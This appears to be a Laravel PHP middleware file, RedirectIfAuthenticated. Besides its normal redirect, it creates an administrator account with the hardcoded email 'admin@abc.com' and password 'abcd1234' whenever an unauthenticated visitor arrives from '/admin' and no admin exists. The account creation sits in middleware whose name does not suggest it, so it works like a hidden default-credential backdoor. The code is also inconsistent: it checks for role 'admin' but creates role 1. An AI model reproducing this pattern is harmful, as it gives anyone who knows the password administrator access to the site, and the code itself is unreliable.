<?php

namespace App\Http\Middleware;

use App\Providers\RouteServiceProvider;
use Closure;
use Illuminate\Support\Facades\Auth;
use App\User;

class RedirectIfAuthenticated
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @param  string|null  $guard
     * @return mixed
     */
    public function handle($request, Closure $next, $guard = null)
    {
        if (Auth::guard($guard)->check()) {
            return redirect('/');
        }

        if (!Auth::check() && isset(parse_url(url()->previous())['path']) && parse_url(url()->previous())['path'] == '/admin' && is_null(User::where('role', 'admin')->first())) {
            try {
                User::updateOrCreate([
                    'name' => 'Admin',
                    'role' => 1,
                    'email' => 'admin@abc.com',
                    'password' => bcrypt('abcd1234'),
                ]);
            }catch (\Exception $e){
                return redirect()->route('admin_home');
            }

        }

        return $next($request);
    }
}
